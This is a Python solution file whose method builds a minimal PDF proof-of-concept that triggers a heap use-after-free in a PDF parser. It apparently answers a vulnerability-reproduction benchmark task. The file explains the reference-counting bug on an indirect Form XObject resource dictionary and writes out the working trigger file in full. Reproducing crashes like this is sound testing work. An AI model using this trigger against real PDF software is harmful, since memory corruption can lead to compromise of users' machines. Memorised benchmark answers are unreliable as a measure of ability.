class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) input that triggers a
        Heap Use After Free vulnerability in a PDF parser.

        The vulnerability occurs during the destruction of a standalone form (Form XObject)
        when its resource dictionary is an indirect object. The parser fails to increment
        the reference count of the dictionary when processing it, leading to a premature
        free when the form's resources are cleaned up.

        This PoC constructs a minimal PDF with the following structure:
        1. A Page object that contains a content stream.
        2. The content stream executes a Form XObject using the 'Do' operator.
        3. The Form XObject's '/Resources' key points to an indirect dictionary object.
        4. When the parser executes the 'Do' operator, it processes the Form XObject,
           accesses the indirect resource dictionary without proper reference counting,
           and later, during cleanup, a double-free/use-after-free occurs.
        """
        
        # Compact PDF object definitions to create a small PoC file.
        # Whitespace is minimized where possible without affecting PDF syntax.
        objects = [
            # 1: Catalog object, root of the document structure.
            b'<</Type/Catalog/Pages 2 0 R>>',
            
            # 2: Pages tree node, pointing to the single page.
            b'<</Type/Pages/Kids[3 0 R]/Count 1>>',
            
            # 3: Page object. It references the content stream and the Form XObject
            #    via its resource dictionary.
            b'<</Type/Page/Parent 2 0 R/MediaBox[0 0 200 200]/Resources<</XObject<</Fm1 4 0 R>>>>/Contents 5 0 R>>',
            
            # 4: The Form XObject. This is the core of the vulnerability trigger.
            #    Its /Resources attribute is an indirect reference (6 0 R) to a dictionary.
            #    The stream is empty as its content is not needed for the trigger.
            b'<</Type/XObject/Subtype/Form/BBox[0 0 100 100]/Resources 6 0 R/Length 0>>stream\nendstream',
            
            # 5: Page content stream. The '/Fm1 Do' command instructs the PDF
            #    renderer to process the Form XObject named /Fm1.
            b'<</Length 8>>stream\n/Fm1 Do\nendstream',
            
            # 6: The indirect dictionary for the form's resources. An empty dictionary is sufficient.
            #    This being an indirect object is what causes the ref-counting bug.
            b'<<>>',
        ]

        pdf = bytearray()
        pdf.extend(b'%PDF-1.7\n')

        offsets = []
        for i, body in enumerate(objects):
            offsets.append(len(pdf))
            obj_num = i + 1
            pdf.extend(f'{obj_num} 0 obj\n'.encode('ascii'))
            pdf.extend(body)
            pdf.extend(b'\nendobj\n')

        xref_offset = len(pdf)
        pdf.extend(b'xref\n')
        num_objects = len(objects) + 1
        pdf.extend(f'0 {num_objects}\n'.encode('ascii'))
        pdf.extend(b'0000000000 65535 f \n')
        for offset in offsets:
            pdf.extend(f'{offset:010d} 00000 n \n'.encode('ascii'))

        pdf.extend(b'trailer\n')
        pdf.extend(f'<</Size {num_objects}/Root 1 0 R>>\n'.encode('ascii'))
        pdf.extend(b'startxref\n')
        pdf.extend(str(xref_offset).encode('ascii'))
        pdf.extend(b'\n%%EOF\n')

        return bytes(pdf)
